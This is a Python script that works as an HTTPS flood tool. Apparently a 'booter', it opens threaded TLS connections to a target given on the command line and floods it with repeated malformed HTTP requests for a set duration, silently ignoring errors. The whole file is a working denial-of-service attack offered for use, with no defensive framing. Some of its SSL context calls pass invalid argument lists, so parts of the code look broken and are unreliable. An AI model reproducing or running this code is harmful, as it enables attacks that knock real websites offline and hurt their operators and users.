import socks,ssl,socket,random,string,time,threading,sys,warnings
warnings.filterwarnings('ignore',category=DeprecationWarning)
from urllib.parse import urlparse

def generate_url_path(num):
    data = "".join(random.sample(string.printable, int(num)))
    return data

def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

def get_target(url):
    url = url.rstrip()
    target = {}
    parsed_url = urlparse(url)
    target['uri'] = parsed_url.path or '/'
    target['host'] = parsed_url.netloc
    target['scheme'] = parsed_url.scheme
    return target

def tls_test(target, run_time,methods,port):
    for _ in range(int(run_time)):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((str(target['host']), int(port)))
            sock.connect_ex((str(target['host']), int(port)))
            context_list = [
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS),
                ssl.SSLContext(ssl.PROTOCOL_TLSv1_2,ssl.PROTOCOL_TLSv1,ssl.PROTOCOL_TLS),
                ssl.SSLContext(ssl.PROTOCOL_TLS,ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT,ssl.PROTOCOL_TLS_SERVER),
                ssl.SSLContext(),
                ssl.create_default_context(),
                ssl._create_unverified_context(),
                ssl._create_default_https_context()
            ]
            context = random.choice(context_list)
            ssl_sock = context.wrap_socket(sock, server_hostname=target['host'])
            url_path = generate_url_path(1)
            url_leak = ''
            if target['uri'] == '/':
               url_leak = target['uri']
            else:
               url_leak = '/'
            byt = f"{methods} {url_leak} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            byt2 = f"{methods} /{url_path} HTTP/1.1\nHost: {target['host']}\n\n\r\r".encode()
            for _ in range(100):
                ssl_sock.sendall(byt2)
                ssl_sock.send(byt)
            ssl_sock.close()
        except:
            pass

def RUNNING_HTTPS_ALL(port,target,time_booter,METHODS):
   for _ in range(int(5)):
        threading.Thread(target=tls_test, args=(target, time_booter,METHODS,port)).start()
url = ''
port = 0
time_booter = 0
methods = ''

if len(sys.argv) == 5:
 url = str(sys.argv[1]).lower()
 port = int(sys.argv[2])
 time_booter = int(sys.argv[3])
 methods = str(sys.argv[4])
target = get_target(url)

threading.Thread(target=RUNNING_HTTPS_ALL,args=(port,target,time_booter,methods)).start()